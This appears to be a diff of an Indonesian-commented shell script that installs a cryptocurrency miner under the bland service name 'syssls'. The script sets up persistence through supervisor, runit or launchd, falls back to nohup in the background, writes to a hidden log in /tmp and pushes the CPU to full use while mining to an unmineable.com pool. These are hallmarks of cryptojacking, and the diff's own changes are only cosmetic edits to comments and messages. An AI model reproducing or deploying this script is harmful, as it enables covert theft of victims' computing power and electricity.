@@ -196,7 +196,7 @@ stdout_logfile=/var/log/syssls.out.log" > /etc/supervisor/conf.d/syssls.conf
         echo -e "#!/bin/sh
 exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/service/syssls/run
 
-        chmod +x /etc/service/syssls/run
+                chmod +x /etc/service/syssls/run
         sv start syssls
 
         echo "Layanan dimulai menggunakan runit."
@@ -231,14 +231,14 @@ exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$I
 
         echo "Layanan dimulai menggunakan launchd."
     else
-        # Jika tidak menggunakan sistem init, jalankan dengan nohup
+        # Jika tidak menggunakan sistem init, jalankan dengan nohup di background
         nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
-        echo "Menjalankan miner sebagai user non-root dengan nohup."
+        echo "Menjalankan miner sebagai user non-root di background dengan nohup."
         echo "Worker : $HOSTNAME_REPLACED"
     fi
 else
-    # Jika bukan root, bunuh proses miner sebelum menjalankan nohup
+    # Jika bukan root, bunuh proses miner sebelum menjalankan nohup di background
     nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
-    echo "Menjalankan miner sebagai user non-root dengan nohup."
+    echo "Menjalankan miner sebagai user non-root di background dengan nohup."
     echo "Worker : $HOSTNAME_REPLACED"
 fi
